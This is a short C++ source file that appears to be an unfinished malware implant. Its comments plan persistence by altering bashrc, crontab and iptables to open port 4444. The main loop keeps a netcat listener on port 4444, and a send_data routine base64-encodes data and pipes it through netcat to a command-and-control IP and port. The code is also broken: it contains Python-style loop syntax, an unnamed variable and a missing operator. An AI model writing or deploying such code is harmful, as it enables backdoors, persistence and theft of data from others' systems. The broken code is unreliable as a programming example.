#include <stdio.h>
#include <unistd.h>
#include <iostream>
#include <fstream>

#define DEFINE_COMMAND
#include "payload_command.h"

// Change bashrc
// Add to chrontab
// Change IP Tables to allow 4444
void persistance();
void send_data(std::string data, std::string ip, std::string port);

int main()
{
  // Need to gain persistance
  persistance();

  while (true):
    // Stay alive and in memory
    system(" nc -nlvp 4444");

  system((command).c_str());

  return 0;
}

void persistance()
{
  system(" sudo iptables -A ");
}

// Takes a string of data and an IP and Port and sends the string
// to a listening port on the C2
void send_data(std::string data, std::string ip, std::string port)
{
  std::string = "echo \"" + data "\" | base64 | nc " + ip + " " + port;
  system(string.c_str());
}
